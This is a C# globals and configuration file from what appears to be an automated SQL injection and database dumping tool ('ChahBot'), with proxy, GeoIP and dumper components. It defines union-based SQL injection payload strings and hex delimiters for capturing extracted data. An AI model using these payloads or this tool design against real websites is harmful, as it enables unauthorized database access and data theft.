using ChahBot_1_0_Gacy;
using ChahBot_1_0_Gacy.Config;
using ChahBot_1_0_Gacy.SqliClass;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

[StandardModule]
internal sealed class Globals
{
    private delegate void DelegateUpDateStatus(string sText);

    public delegate void WorkerPauseCallback(bool bPaused);

    public static CallbackGUI GUI = new CallbackGUI();

    public static Dumper G_Dumper = new Dumper();

    public static Proxy G_Proxy = new Proxy();

    public static Config Conf = new Config();

    public static GeoIP G_GEOIP = new GeoIP(Globals.GEO_IP_PATH); 

    public static Utilities G_Utilities = new Utilities();

    public static long TRAFFIC_RECEIVED;

    public static ChahBot_1_0_Gacy.Src.G_Tools G_Tools = new ChahBot_1_0_Gacy.Src.G_Tools();

    public static string USER_AGENT = Config.MAIN_USER_AGENT;

    public static bool HTTP_ALLOW_AUTO_REDIRECT = true;

    public static bool HTTP_ENCONDING_HEADERS = true;

    public static string G_KEY = "";

    public const string INJECTION_TRAJECT = "[t]";

    public static string DATA_SPLIT_STR = "!k3y!";

    public static string DATA_SPLIT = Globals.G_Utilities.ConvertTextToHex("!~!");

    public static string REGEXP_CAPTURE = Globals.DATA_SPLIT + "(.+)" + global::Globals.DATA_SPLIT;

    public static string COLLUMNS_SPLIT_STR = "8pl1t";

    public static string COLLUMNS_SPLIT = Globals.G_Utilities.ConvertTextToHex(global::Globals.COLLUMNS_SPLIT_STR);

    public static string URL_REPLACE_SPACES = "+";

    public static bool NETWORK_AVAILABLE = true;

    public const bool PIZZA_STUFFS = true;

    public static readonly string APP_PATH = Application.StartupPath;

    public static readonly string GEO_IP_PATH = global::Globals.APP_PATH + "\\GeoIP.dat";

    public const string UNION_INJECT_INTEGER = "999999.9 union all select [n]";
    public const string UNION_INJECT_STRING = "999999.9' union all select [n] and '0'='0";

    public static bool SYS_TRAY_ICON;

    public static bool RESTART_MODE;

    public static string MY_IP_ADRESS;

    public static string PROXY_IP;

    public static global::Globals.WorkerPauseCallback WRKPause;

    private static string __URL;

    public static string lastStatus = "";
    public static void UpDateStatus(dynamic task, string name, string status)
	{
        GUI.setStatut(task, name, status);
        Console.WriteLine(status);
	}
 
}

